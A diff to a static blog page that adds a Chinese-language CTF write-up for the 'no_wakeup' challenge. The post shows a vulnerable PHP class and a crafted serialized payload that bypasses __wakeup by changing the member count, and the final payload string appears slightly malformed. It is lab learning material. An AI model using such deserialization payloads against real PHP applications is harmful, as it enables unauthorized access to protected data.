@@ -69,6 +69,72 @@
       <div class="outer">
         <section id="main">
   
+    <article id="[swpuctf-新生赛-no-wakeup-1" class="h-entry article article-type-[swpuctf" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T14:10:33.000Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/">新生赛]no_wakeup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>进入靶机<br> &lt;?php</p>
+<p>header(“Content-type:text&#x2F;html;charset&#x3D;utf-8”);<br>error_reporting(0);<br>show_source(“class.php”);</p>
+<p>class HaHaHa{</p>
+<pre><code>    public $admin;
+    public $passwd;
+
+    public function __construct()&#123;
+        $this-&gt;admin =&quot;user&quot;;
+        $this-&gt;passwd = &quot;123456&quot;;
+    &#125;
+
+    public function __wakeup()&#123;
+        $this-&gt;passwd = sha1($this-&gt;passwd);
+    &#125;
+
+    public function __destruct()&#123;
+        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;
+            include(&quot;flag.php&quot;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;passwd;
+            echo &quot;No wake up&quot;;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>$Letmeseesee &#x3D; $_GET[‘p’];<br>unserialize($Letmeseesee);</p>
+<p>?&gt;<br>知识点：反序列化、weakup()绕过<br>在代码中我们可以发现含有sha1不可逆算法，因此考虑到绕过__weakup()函数<br>根据php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup()<br>总上述代码特征<br>构造<br>$aa &#x3D; new HaHaHa();<br>$aa-&gt;admin &#x3D; “admin”;<br>$aa-&gt;passwd &#x3D; “wllm”;<br>$stus &#x3D; serialize($aa);<br>print_r($stus);<br>运行后得到<br>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>修改一下成员个数，得<br>O:6:”HaHaHa”3::{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>上传后得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/" data-id="cm63pev0j0000w0va8x5o9382" data-title="新生赛]no_wakeup" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/15/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
@@ -233,6 +299,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/">新生赛]no_wakeup</a>
+          </li>
         
           <li>
             <a href="/2025/01/15/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">web文件上传</a>
